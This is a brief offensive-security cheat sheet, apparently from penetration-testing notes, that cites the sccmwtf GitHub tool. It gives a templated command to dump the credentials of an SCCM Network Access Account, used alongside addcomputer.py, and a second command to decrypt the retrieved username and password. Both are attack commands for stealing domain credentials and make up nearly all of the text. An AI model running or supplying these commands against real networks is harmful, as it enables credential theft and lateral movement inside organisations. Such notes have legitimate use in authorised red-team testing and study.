### Source
https://github.com/xpn/sccmwtf

### Dump credentials of the Network Access Account (SCCM) - use in combation with addcomputer.py
```
python3 sccmwtf.py <targetAccount> <targetFqdn> <networkAccessAccount> "<domain>\<computerAccount>" "<password>"
```

### Deobfuscate retrieved user and password (beginning after: [CDATA[...)
```
policysecretdecrypt.exe <string>
```

